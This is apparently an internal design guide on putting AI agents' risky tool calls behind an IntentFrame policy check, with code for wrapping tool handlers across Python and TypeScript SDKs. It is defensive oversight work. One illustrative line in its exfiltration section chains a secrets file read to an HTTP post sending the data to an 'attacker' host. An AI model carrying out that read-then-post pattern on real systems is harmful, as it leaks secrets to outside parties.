# Agent Tool Gating for IntentFrame — Pattern & Portability Guide

> How to put an agent's **consequential** tool calls on an IntentFrame governed
> path — without rewriting the agent, without wrapping every tool, and without
> caring much what language or SDK the agent is built on.

This doc captures the design reasoning behind the Hermes integration and
generalizes it to other agents (Python and TypeScript SDKs). It is the
conceptual companion to the implementation roadmap in
[`hermes/TODO.md`](hermes/TODO.md) and builds on IntentFrame's adoption guidance
in
[`do-i-have-to-rewrite-tools.md`](../external-reference-only-libs/intentframe/docs/executor/do-i-have-to-rewrite-tools.md).

---

## TL;DR

- **Goal:** judgment before a consequential action. Govern the *privileged path*
  (state changes + external/exfil channels), leave reads/helpers in-process.
- **Mechanism:** for each governed tool, change **two layers** — (1) the tool
  **schema** must require a `reason` so the model explains itself; (2) the
  **executor** must call the IntentFrame adapter and only run on `ALLOW`.
- **Wrap, don't rewrite.** Keep the original tool handler; prepend a validate
  gate (decorator/proxy). Full rewrites and source refactors are a last resort,
  not the default.
- **Selective, not blanket.** Pick a curated allowlist of tools **by name**
  (toolsets mix reads and writes). Start with the 3–5 riskiest actions.
- **Portability is high.** Any agent whose tools are *objects in a reachable
  registry* (almost all Python/TS SDKs) supports this. Some SDKs even give a
  native veto hook, so no reflection is needed at all.
- **The constant cost is the mapper.** Translating each tool into an IntentFrame
  action + policy is per-tool semantic work you redo for every agent. The
  wiring is ~20%; the mapping + policy is ~50%; lifecycle robustness ~20%.
- **The reusable core is language-neutral.** Adapter, bridge, and policy talk
  JSON over a local socket. Only a thin agent-side *shim* is SDK/language
  specific.

---

## 1. The problem

An agent "turns thought into effect" the moment it executes a tool. IntentFrame
wants **judgment** (should this be allowed?) to happen *before* the
**execution** (the side effect). Hermes makes this convenient because it exposes
a native local tool gate — a plugin can override the `terminal` tool, require a
`reason`, call a local adapter, and only then delegate to the real tool.

The questions this doc answers:

1. When an agent does **not** have a clean native gate like Hermes, can you
   inject one — e.g. by reflection/metaprogramming — or are source changes
   inevitable?
2. Can the gate be **generalized** beyond one tool without wrapping *everything*?
3. How portable is the pattern across other agents and SDKs (Python and TS)?

---

## 2. Core concept: two layers per governed tool

For an LLM agent there are always two distinct surfaces, and a meaningful gate
must touch **both**:

| Layer | What it is | What the gate does |
|-------|-----------|--------------------|
| **Schema** | The JSON/tool spec advertised *to the model* | Inject a **required `reason`** so the model is forced to explain intent |
| **Executor** | The function that actually runs the tool | Call the adapter to **validate before** the side effect; block on deny |

Patching only the executor gives you a gate the model doesn't know how to feed
(it never supplies `reason`). Patching only the schema asks for a reason but
never enforces anything. You need both, every time.

---

## 3. Wrap, don't rewrite

### The pattern

You almost never need to rewrite a tool's body. Keep the original callable and
**prepend** the gate — the classic decorator/proxy pattern:

```python
def wrap(orig, tool_name):
    def handler(args, **ctx):
        verdict = adapter.validate_tool(tool_name, args, context=ctx)
        if not verdict.get("allowed"):
            return blocked_response(verdict.get("error") or "blocked by IntentFrame")
        # strip the synthetic field, delegate to the untouched original
        return orig({k: v for k, v in args.items() if k != "reason"}, **ctx)
    return handler
```

Then, reflectively, over the agent's tool registry:

```python
for tool in registry:
    if tool.name not in GOVERNED_TOOLS:        # selectivity (Section 4)
        continue
    tool.schema = inject_reason(tool.schema)   # layer 1
    tool.handler = wrap(tool.handler, tool.name)  # layer 2
```

That's the whole trick: introspect the registry, wrap each governed executor,
inject `reason` into each governed schema. No full rewrites, no refactoring of
original bodies.

### Reflection vs source changes

"Can I do this with reflection (like Java/Groovy), or must I change source?"
depends on the language and on how tools are dispatched:

| Runtime | Mechanism | Source edits? |
|---------|-----------|---------------|
| **JVM (Java/Groovy)** | Dynamic proxies, `metaClass`/`invokeMethod`, AspectJ/Spring AOP, ByteBuddy/ASM, `-javaagent` | No |
| **Python** | Monkeypatch registry, decorators, `__getattr__`, import hooks | No |
| **JS/TS (Node)** | Object-spread at construction, `Proxy`, patch module exports | No |
| **Ruby** | `prepend`, `alias_method` | No |
| **Go** | No real runtime monkeypatch (only fragile machine-code hacks) | **Yes** — interface wrap / codegen |
| **Rust** | No runtime reflection; macros/codegen at compile time | **Yes** — source/macro |

So: **dynamic languages → reflection works with zero/minimal source edits;
static/compiled languages → compile-time codegen or actual refactoring.** Source
refactoring of raw tool bodies is the *last* resort, not the inevitable one.

### When source changes / codemods become unavoidable

- **Inline dispatch** — a big `if/elif`/`switch` on tool name with bodies inline
  and no separate function object to wrap. Patch the dispatcher or AST-codemod.
- **Hardcoded schema blobs** — schema is a static JSON/string, not generated.
  Injecting `reason` is a file edit (config-level, not deep refactor).
- **Static/compiled runtime** (Go/Rust) — wrap at interfaces/traits in source.
- **Remote / out-of-process tools** — nothing to intercept in-process; see the
  transport-proxy fallback in Section 9.

---

## 4. Selective, not blanket

Do **not** gate every tool. IntentFrame's own guidance
([`do-i-have-to-rewrite-tools.md`](../external-reference-only-libs/intentframe/docs/executor/do-i-have-to-rewrite-tools.md))
is to govern the **privileged path** and leave low-risk helpers in-process. The
current Hermes plugin already sits on the recommended rung: **Level 2
validate-only** (IntentFrame judges, the agent executes locally after `ALLOW`).

### Govern vs leave in-process

| Govern (privileged path) | Leave in-process (low risk) |
|--------------------------|------------------------------|
| Shell / process / code execution | Deterministic parsing, formatting, math |
| File writes, destructive admin | Internal read-only helpers |
| Payments, refunds, account/state changes | Retrieval whose output stays in private context |
| **External comms** — email, Slack, tickets, webhooks, outbound HTTP | Summarization / ranking helpers |
| IAM, deploy, infra changes | |

### The exfiltration caveat

"Changes system state" is the right instinct but slightly too narrow. A
read-only tool plus an *ungoverned outbound channel* equals data exfiltration:

```
read_file("secrets")  ->  http_post("https://attacker/?data=...")
```

Neither call is a classic "write," but together they leak. So the gating axis is
**"changes state OR communicates externally."** Govern outbound channels even
when they aren't local writes.

### Select by tool *name*, not toolset

Toolsets bundle reads and writes together, so a toolset-level filter is too
coarse. (Grounded in the Hermes registry — see Section 5.)

| Risk class | Govern (examples) |
|------------|-------------------|
| Local shell / process | `terminal`, `process` |
| Local file writes | `write_file`, `patch` |
| Code execution | `execute_code` |
| Computer / device control | `computer_use`, `ha_call_service` |
| Delegation | `delegate_task` |
| Outbound / exfil channels | `web_extract`, selected `browser_*`, messaging tools, `cronjob`, `memory` |

**Explicitly ungoverned (v1):** `read_file`, `search_files`, `read_terminal`,
`session_search`, `browser_snapshot`, and `list`/`get`/`query` reads — unless an
exfil pairing makes a read sensitive.

---

## 5. Grounded case study: Hermes

Hermes is the "good-case" agent because it has a real tool registry and a
plugin system that can override a tool before execution.

### The registry makes wrapping clean

[`tools/registry.py`](../external-reference-only-libs/hermes-agent/tools/registry.py)
is exactly the "tools as objects" registry the wrap pattern assumes:

- `ToolEntry` carries `name, toolset, schema, handler, check_fn, is_async`.
- `_snapshot_entries()` enumerates all tools; `get_entry(name)` fetches one.
- `register(..., override=True)` cleanly replaces an entry; `deregister` removes.
- a `_generation` counter that downstream `get_definitions()` memoizes against,
  so re-registering propagates schema changes.

The plugin facade `ctx.register_tool` is a thin wrapper over
`from tools.registry import registry`, and the existing plugin already imports
Hermes internals — so enumerating the registry is no new coupling.

### Current state: a single-tool gate

The shipped plugin gates exactly one tool:

The shipped plugin gates governed tools via `intentframe-gate`:

- [`plugin/intentframe-gate/schema.py`](hermes/plugin/intentframe-gate/schema.py)
  injects a required `reason` into governed tool schemas (layer 1).
- [`plugin/intentframe-gate/gate.py`](hermes/plugin/intentframe-gate/gate.py)
  validates via the adapter, strips `reason`, delegates to the real handler (layer 2).
- [`plugin/intentframe-gate/__init__.py`](hermes/plugin/intentframe-gate/__init__.py)
  registers governed tools with `override=True` and hooks `registry.register`.

### Generalizing it

Replace the hardcoded single tool with a governed-tool loop. The generic wrapper
is actually **simpler** than the terminal-specific one (which hand-maps named
kwargs) — it strips `reason` and passes the rest through opaquely:

```python
from tools.registry import registry

def register(ctx):
    for entry in registry._snapshot_entries():
        if entry.name not in GOVERNED_TOOLS:
            continue
        ctx.register_tool(
            name=entry.name, toolset=entry.toolset,
            schema=inject_reason(entry.schema),
            handler=wrap(entry.handler, entry.name),
            check_fn=entry.check_fn, is_async=entry.is_async,
            override=True,          # bumps _generation -> schema refresh
        )
```

### Why toolset filtering fails (the evidence)

Hermes' own toolsets mix reads and writes — proof that you must select by name:

| toolset | read-only (skip) | state-changing (gate) |
|---------|------------------|------------------------|
| `file` | `read_file`, `search_files` | `write_file`, `patch` |
| `terminal` | `read_terminal` | `terminal`, `process` |
| `homeassistant` | `ha_get_state`, `ha_list_*` | `ha_call_service` |
| `browser` | `browser_snapshot`, `browser_console` | `browser_navigate`, `browser_click`, `browser_type` |

### The real bottleneck: the mapper

[`adapter/src/hermes_adapter/mapper.py`](hermes/adapter/src/hermes_adapter/mapper.py)
is hardcoded to one tool:

```python
def map_tool(tool, args):
    if tool == "terminal":
        return map_terminal(args)   # -> {"action": "RUN_COMMAND", ...}
    raise ValidationError(f"Unsupported tool for validation: {tool!r}")
```

If the plugin gates a tool the mapper doesn't map, validate **fails closed** —
the tool is blocked, not allowed through. Safe, but it means a half-finished
allowlist silently bricks tools. Every governed name needs a matching
`map_<tool>` (→ IntentFrame action). **Wrapping is easy; meaningful per-tool
policy is the work.**

To prevent drift, make the **adapter the single source of truth**: expose
`supported_tools()` and have the plugin derive its wrap-set from it (or a shared
YAML both read).

### Lifecycle: a one-shot wrap is not enough

Built-in tools self-register at import time, but **MCP tools register/refresh
dynamically**. A wrap-everything-once loop will (a) miss tools registered later,
and (b) get silently clobbered when MCP refresh reinstalls the *unwrapped*
handler. Robust options:

- **A (simpler):** re-run the wrap on governed names after MCP refresh.
- **B (robust):** monkeypatch `registry.register` so every present *and future*
  registration of a governed name is gated on the way in.

### Effort breakdown

| Phase | Work | Share |
|-------|------|-------|
| 1 | Selective registry wrap (plugin) | ~20% (mechanical) |
| 2 | Mapper + policy per governed tool | ~50% (the real work) |
| 3 | Registry lifecycle / MCP robustness | ~20% |
| 4 | Observability & ops | ~10% |

See [`hermes/TODO.md`](hermes/TODO.md) for the full phased roadmap.

---

## 6. Portability — Python SDKs

The pattern reduces to a 4-point checklist for any SDK:

1. **Discover** tools as objects (name + schema + callable).
2. **Mutate the schema** so the model must supply `reason`.
3. **Intercept before execution** and be able to *block*.
4. **Selectively**, by tool name.

Almost every Python SDK gives #1/#2/#4 for free (tools are decorated callables
in a list/dict). The differentiator is **#3**: a *native veto hook* (register a
callback, no reflection) vs *wrap the tool object* vs *you own the loop*.

| SDK | Tools as objects? | Schema form | Interception (#3) | Effort |
|-----|-------------------|-------------|-------------------|--------|
| **Google ADK** | yes (`FunctionTool`) | signature-derived | **native `before_tool_callback`** (return value short-circuits) | Easiest |
| **Semantic Kernel** | yes (`KernelFunction`) | pydantic-ish | **native function-invocation filters** (`await next(ctx)` / short-circuit) | Easiest |
| **OpenAI Agents SDK** | yes (`agent.tools`) | **raw JSON dict** | guardrails (tripwire) + lifecycle hooks | Easy |
| **LangChain / LangGraph** | yes (`BaseTool`) | **pydantic `args_schema`** | wrap tool, or pre-tool graph node; callbacks are observational | Easy–Medium |
| **AutoGen** | yes (`FunctionTool`) | pydantic | wrap the tool object | Easy–Medium |
| **CrewAI / LlamaIndex / Pydantic AI** | yes | pydantic / metadata | wrap the tool object | Easy–Medium |
| **Raw OpenAI / Anthropic / Gemini loop** | no framework — you dispatch | JSON you write | inline in your loop | Trivial |

Mechanical wrinkles that decide Easy vs Medium:

- **Schema form.** Raw JSON dict (OpenAI Agents, Gemini, Anthropic) is easiest to
  mutate; pydantic `args_schema` (LangChain, Pydantic AI, SK) means extending the
  model or building a new tool.
- **Block point.** Native hook = register a callback. Object-wrap = replace each
  governed tool in the list you pass in. LangChain callbacks (`on_tool_start`)
  are observation-only — wrap the tool or insert a graph node instead.

**Native hooks also solve lifecycle for free.** ADK `before_tool_callback`, SK
filters, and OpenAI guardrails intercept at the *invocation boundary by
construction*, so they automatically cover dynamic/MCP tools and can't be
clobbered. Object-wrap SDKs (LangChain, AutoGen, CrewAI) inherit the same
lifecycle fragility as Hermes — so "native hook vs wrap" is also a robustness
ranking, not just convenience.

---

## 7. Portability — TypeScript SDKs

Same checklist; TS is mechanically a touch *lighter* because tools are plain
objects (`{ name, parameters, execute }`) you usually construct yourself, so
"wrap don't rewrite" is object-spread, not even reflection.

| SDK | Tools as objects? | Schema form | Interception (#3) | Effort |
|-----|-------------------|-------------|-------------------|--------|
| **OpenAI Agents SDK (TS)** | yes (`tool({...})`) | Zod or JSON | guardrails + hooks, or wrap `execute` | Easy |
| **Vercel AI SDK** | yes (tools record) | Zod (`inputSchema`) or `jsonSchema()` | wrap `execute`; **or `wrapLanguageModel` middleware** (transport) | Easy |
| **LangChain.js / LangGraph.js** | yes (`DynamicStructuredTool`) | Zod | wrap tool, or pre-tool `ToolNode` | Easy–Medium |
| **Mastra** | yes (`createTool({...})`) | Zod | wrap `execute`; framework middleware | Easy |
| **Genkit** (Google, TS-first) | yes (`ai.defineTool`) | Zod | wrap, or action middleware | Easy |
| **LlamaIndex.TS** | yes (`FunctionTool`) | Zod/JSON | wrap | Easy–Medium |
| **Raw `@anthropic-ai/sdk` / `openai` / `@google/genai` loop** | no framework | JSON you write | inline | Trivial |

### Where TS is nicer than Python

- **Zod `.extend()` beats pydantic** for schema injection — one ergonomic line:
  `schema.extend({ reason: z.string().describe("why…") })`.
- **No sync/async split.** Tool `execute` is uniformly `async` — the `is_async`
  dual-wrapper Hermes needs just collapses.
- **Wrapping is object-spread, not introspection:**

  ```ts
  const gate = (t) => ({
    ...t,
    parameters: t.parameters.extend({ reason: z.string() }),   // layer 1
    execute: async (args, ctx) => {                            // layer 2
      const v = await adapter.validateTool(t.name, args);
      if (!v.allowed) return blocked(v);
      const { reason, ...rest } = args;
      return t.execute(rest, ctx);
    },
  });
  const governed = Object.fromEntries(
    Object.entries(tools).map(([k, t]) => [k, GOVERNED.has(k) ? gate(t) : t])
  );
  ```

- **Vercel's `wrapLanguageModel` is a clean transport hook** — rewrite the
  `tools[]` sent to the model (inject `reason`) and catch tool calls in the
  response. Idiomatic, and covers all tools (including dynamic) by construction.

### TS-specific gotchas

- **Fewer native veto hooks** → you mostly wrap, so the dynamic/MCP lifecycle
  concern bites more often. Wrap at the merge point (e.g. tools from
  `experimental_createMCPClient`) or use `wrapLanguageModel`.
- **Two schema code paths** — Zod (`.extend()`) vs raw `jsonSchema()` (mutate the
  dict). Your `injectReason()` needs both branches.
- **MS/Google have weaker TS framework stories** — the native-filter advantage
  (SK, ADK) doesn't carry to TS; the Google path is Genkit or raw `@google/genai`.

---

## 8. What never changes — the constant cost

Regardless of agent or language:

- **The mapper + policy is per-tool semantic work.** Translating each tool into an
  IntentFrame action (`write_file` → `WRITE_FILE`, `ha_call_service` →
  `DEVICE_CONTROL`, messaging → `SEND_MESSAGE`) and writing the policy behind it
  is the real ~50%. SDK choice changes how you *catch* the call, not what it
  *means* to IntentFrame.
- **The reusable core is language-neutral.** The adapter, bridge, and policy talk
  **JSON over a local socket (UDS/HTTP)**. A TS agent reuses the existing Python
  adapter unchanged — its shim just needs a Node socket client (a few lines).
  Only the thin agent-side shim is SDK/language specific.

So "support a new agent" ≈ one small wrap shim + a socket client (TS only) + the
per-tool mappings you'd write anyway.

---

## 9. When it's hard / doesn't apply

The "tools as objects in a reachable registry" assumption carries everything
above. It breaks when:

- **Inline dispatch** — `switch (toolName)` with inline bodies, no object to
  wrap → AST/codemod or source edit.
- **Black-box / remote tool execution** — nothing to intercept in-process.
- **Closed SaaS agent** — no plugin, no source, no registry.

**Fallback: transport-level proxy.** Sit between the agent and the model:

- On the **request**, rewrite the `tools[]` array — inject `reason` into each
  governed schema.
- On the **response**, catch each `tool_call` and validate before dispatch.

This needs no reflection and no agent source edits — it works against
Go/Rust/closed agents alike. The catch: it only sees what crosses the wire.
Vercel's `wrapLanguageModel` is the cleanest in-SDK expression of this idea.

---

## 10. Integration decision guide

```
Does the agent expose tools as objects in a reachable registry?
├─ No  → transport-level proxy (Section 9), or source codemod if you own it
└─ Yes → Does it offer a native pre-execution veto hook?
         ├─ Yes (ADK / SK / OpenAI guardrails / Hermes override)
         │     → register a callback; lifecycle handled for free
         └─ No  → wrap the tool objects (Sections 3, 6, 7)
                  → also handle dynamic/MCP lifecycle (Section 5)

For every governed tool, regardless of the above:
  1. Inject required `reason` into the schema   (layer 1)
  2. Validate via adapter before execute        (layer 2)
  3. Add a map_<tool> -> IntentFrame action      (the real work)
  4. Add policy + action_types                   (per action family)
```

Recommended order: pick the 3–5 riskiest actions → write the mapper + policy for
the next one → wire the selective wrap → E2E it → expand the allowlist
incrementally with policy review each time.

---

## References

- IntentFrame adoption guidance:
  [`do-i-have-to-rewrite-tools.md`](../external-reference-only-libs/intentframe/docs/executor/do-i-have-to-rewrite-tools.md)
- Hermes roadmap: [`hermes/TODO.md`](hermes/TODO.md)
- Current plugin: [`hermes/plugin/intentframe-gate/`](hermes/plugin/intentframe-gate/)
- Mapper bottleneck:
  [`hermes/adapter/src/hermes_adapter/mapper.py`](hermes/adapter/src/hermes_adapter/mapper.py)
- Hermes tool registry:
  [`tools/registry.py`](../external-reference-only-libs/hermes-agent/tools/registry.py)
- E2E: [`../tests/hermes_gateway/`](../tests/hermes_gateway/)
- Design session:
  [`22_june_2026_refactor-agent-tool-signatures-with-reflection_d9a9f03b.md`](../.claude_chats/22_june_2026_refactor-agent-tool-signatures-with-reflection_d9a9f03b.md)
